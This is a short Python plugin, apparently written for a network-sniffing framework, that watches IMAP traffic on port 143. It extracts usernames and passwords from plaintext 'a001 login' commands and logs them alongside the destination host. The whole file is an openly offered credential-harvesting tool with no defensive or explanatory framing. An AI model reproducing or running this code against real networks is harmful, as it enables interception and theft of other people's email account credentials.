"""IMAP password logger"""
PROPERTY={}
PROPERTY['NAME']="IMAP Logger"
PROPERTY['DESC']="This logs all the IMAP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=143
PROPERTY['DPORT']=143
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:10].lower() =="a001 login"):
            	line = line.split(' ')
            	user, passwd = line[2], line[3]
        if (user != None and passwd != None):
                self.logger.addInfo('IMAP',self.traffic.dst,user,passwd)
                user = None
                passwd = None
